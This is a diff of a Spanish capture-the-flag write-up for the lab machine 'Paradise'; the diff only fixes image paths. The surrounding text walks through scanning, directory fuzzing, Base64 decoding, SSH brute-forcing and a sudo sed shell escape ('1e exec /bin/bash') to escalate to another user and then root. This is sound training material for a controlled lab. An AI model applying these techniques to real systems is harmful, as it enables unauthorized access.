@@ -3,7 +3,7 @@
 * **Nombre de la máquina:** Paradise
 * **Nivel de dificultad:** Fácil
 * **Propósito:** Práctica de técnicas básicas de reconocimiento, enumeración, decodificación, ataque por fuerza bruta y escalada de privilegios en un entorno controlado.
-![Logo](/Imagenes/Logo.png)
+![Logo](Imagenes/Logo.png)
 ---
 
 ## 1. Despliegue de la Máquina
@@ -28,7 +28,7 @@ Confirmamos que la máquina está activa con un `ping` a la dirección IP:
 ping -c 4 172.17.0.2
 ```
 
-![Ping](/Imagenes/Ping.jpeg)
+![Ping](Imagenes/Ping.jpeg)
 
 ---
 
@@ -40,7 +40,7 @@ Realizamos un escaneo completo de puertos para identificar cuáles están abiert
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
 ```
 
-![Puertos abiertos](/Imagenes/Puerto.jpeg)
+![Puertos abiertos](Imagenes/Puerto.jpeg)
 
 Usamos nuestro script personalizado `extractPorts` para extraer los puertos relevantes y luego analizamos los servicios corriendo en ellos:
 
@@ -48,7 +48,7 @@ Usamos nuestro script personalizado `extractPorts` para extraer los puertos rele
 nmap -sC -sV -p 22,80,139,445 172.17.0.2 -oN target.txt
 ```
 
-![Servicios detectados](/Imagenes/Servicios.jpeg)
+![Servicios detectados](Imagenes/Servicios.jpeg)
 
 ---
 
@@ -56,7 +56,7 @@ nmap -sC -sV -p 22,80,139,445 172.17.0.2 -oN target.txt
 
 Al acceder al navegador, encontramos una página web que sirve como punto de entrada:
 
-![Página principal](/Imagenes/Pagina.jpeg)
+![Página principal](Imagenes/Pagina.jpeg)
 
 Realizamos *fuzzing* con **Gobuster** para encontrar directorios ocultos:
 
@@ -64,24 +64,24 @@ Realizamos *fuzzing* con **Gobuster** para encontrar directorios ocultos:
 gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
 ```
 
-![Gobuster](/Imagenes/Gobuster.jpeg)
+![Gobuster](Imagenes/Gobuster.jpeg)
 
 Estos fueron los directorios y archivos detectados:
 
 * `/index.html`
-  ![index.html](/Imagenes/indexhtml.jpeg)
+  ![index.html](Imagenes/indexhtml.jpeg)
 
 * `/img`
-  ![img](/Imagenes/img.jpeg)
+  ![img](Imagenes/img.jpeg)
 
 * `/login.php`
-  ![login.php](/Imagenes/loginphp.jpeg)
+  ![login.php](Imagenes/loginphp.jpeg)
 
 * `/galery.html`
-  ![galery.html](/Imagenes/galeryhtml.jpeg)
+  ![galery.html](Imagenes/galeryhtml.jpeg)
 
 * `/booking.html`
-  ![booking.html](/Imagenes/booking.jpeg)
+  ![booking.html](Imagenes/booking.jpeg)
 
 ---
 
@@ -93,7 +93,7 @@ Al revisar el código fuente de la página, encontramos un mensaje en Base64:
 ZXN0b2VzdW5zZWNyZXRvCg==
 ```
 
-![Base64 encontrado](/Imagenes/base64.jpeg)
+![Base64 encontrado](Imagenes/base64.jpeg)
 
 Lo decodificamos en Bash:
 
@@ -107,7 +107,7 @@ El resultado fue:
 estoesunsecreto
 ```
 
-![Decodificación](/Imagenes/descodificar.jpeg)
+![Decodificación](Imagenes/descodificar.jpeg)
 
 Probamos si esta cadena correspondía a una ruta y descubrimos un nuevo directorio oculto:
 
@@ -115,11 +115,11 @@ Probamos si esta cadena correspondía a una ruta y descubrimos un nuevo director
 http://172.17.0.2/estoesunsecreto/
 ```
 
-![Directorio secreto](/Imagenes/estoesunsecreto.jpeg)
+![Directorio secreto](Imagenes/estoesunsecreto.jpeg)
 
 Dentro había un archivo `.txt` con un mensaje que indicaba que se debía cambiar la contraseña por ser débil. También se menciona el nombre del usuario **lucas**, lo que sugiere que podría ser un usuario válido en el sistema.
 
-![Usuario lucas](/Imagenes/lucas.jpeg)
+![Usuario lucas](Imagenes/lucas.jpeg)
 
 ---
 
@@ -137,7 +137,7 @@ Encontramos la contraseña:
 lucas : chocolate
 ```
 
-![Hydra resultado](/Imagenes/hydra.jpeg)
+![Hydra resultado](Imagenes/hydra.jpeg)
 
 ---
 
@@ -149,7 +149,7 @@ Una vez dentro como lucas vía SSH:
 ssh lucas@172.17.0.2
 ```
 
-![SSH acceso](/Imagenes/ssh.jpeg)
+![SSH acceso](Imagenes/ssh.jpeg)
 
 Descubrimos que lucas puede ejecutar el comando `/bin/sed` como el usuario andy sin necesidad de contraseña (NOPASSWD):
 
@@ -163,7 +163,7 @@ Aprovechamos esto para escalar privilegios a andy:
 sudo -u andy /bin/sed -n '1e exec /bin/bash' /etc/hosts
 ```
 
-![Escalada a andy](/Imagenes/escala.jpeg)
+![Escalada a andy](Imagenes/escala.jpeg)
 
 ---
 
@@ -179,7 +179,7 @@ Encontramos el script: `/usr/local/bin/privileged_exec`
 
 Lo editamos y luego lo ejecutamos, lo que nos otorgó acceso como root.
 
-![Escalada final](/Imagenes/escala2.jpeg)
+![Escalada final](Imagenes/escala2.jpeg)
 
 ---
 
